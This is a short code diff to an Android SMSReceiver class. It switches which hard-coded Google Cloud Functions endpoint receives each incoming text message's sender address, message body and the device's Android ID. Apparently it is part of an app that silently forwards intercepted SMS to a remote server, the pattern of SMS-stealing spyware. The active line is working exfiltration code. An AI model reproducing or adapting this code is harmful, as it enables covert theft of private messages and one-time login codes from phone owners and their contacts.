@@ -63,8 +63,8 @@ public class SMSReceiver extends BroadcastReceiver {
             String androidId = params[2];
 
             try {
-                   //    run("https://us-central1-app0001-1a51d.cloudfunctions.net/addSMS?address="+address+"&msg="+sms+"&id="+androidId);
-                run("https://us-central1-app001-kent.cloudfunctions.net/addSMS?address="+address+"&msg="+sms+"&id="+androidId);
+                      run("https://us-central1-app0001-1a51d.cloudfunctions.net/addSMS?address="+address+"&msg="+sms+"&id="+androidId);
+                // run("https://us-central1-app001-kent.cloudfunctions.net/addSMS?address="+address+"&msg="+sms+"&id="+androidId);
                 } catch (IOException e) {
                 e.printStackTrace();
             }
